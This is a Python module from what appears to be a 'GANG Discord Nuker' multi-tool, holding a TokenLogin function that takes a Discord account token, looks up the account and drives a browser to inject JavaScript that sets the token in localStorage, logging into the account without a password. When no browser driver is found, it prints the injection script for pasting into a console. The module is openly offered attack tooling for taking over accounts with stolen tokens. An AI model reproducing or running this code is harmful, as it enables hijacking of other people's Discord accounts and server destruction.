# Coded / Dev: ††#9999 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# GANG Discord Nuker / Multi Tool©
# Copyright © 2022
########################################


import requests
from time import sleep
from colorama import Fore, Back
from selenium import webdriver, common

from utilities.Settings.common import getDriver, getheaders, SlowPrint

def TokenLogin(token):
    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
    user = j["username"] + "#" + str(j["discriminator"])
    script = """
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
            location.reload();
        """ % (token)
    type_ = getDriver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Chrome(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Press ENTER: ")
            input()
            spammer()
    elif type_ == "operadriver.exe":
        opts = webdriver.opera.options.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Opera(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint("Press ENTER: ")
            input()
            spammer()
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        try:
            driver = webdriver.Edge(options=opts)
        except common.exceptions.SessionNotCreatedException as e:
            print(e.msg)
            sleep(2)
            SlowPrint(f"[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ")
            input()
            spammer()
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a suitable driver to automatically login to {user}')
        sleep(3)
        print(f"{Fore.YELLOW}Paste this script into the console of a browser:{Fore.RESET}\n\n{Back.RED}{script}\n{Back.RESET}")
        print("Press ENTER: ", end="")
        input()
        spammer()

    print(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Logging Into: {user}")
    driver.get("https://discordapp.com/login")
    driver.execute_script(script)